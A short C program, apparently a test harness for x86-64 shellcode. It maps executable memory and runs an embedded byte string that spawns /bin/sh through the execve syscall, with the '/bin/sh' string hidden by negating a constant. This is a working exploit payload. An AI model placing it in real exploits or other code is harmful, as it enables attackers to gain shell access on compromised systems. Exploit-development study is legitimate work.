#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(int argc, char **argv) {
 
    void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}
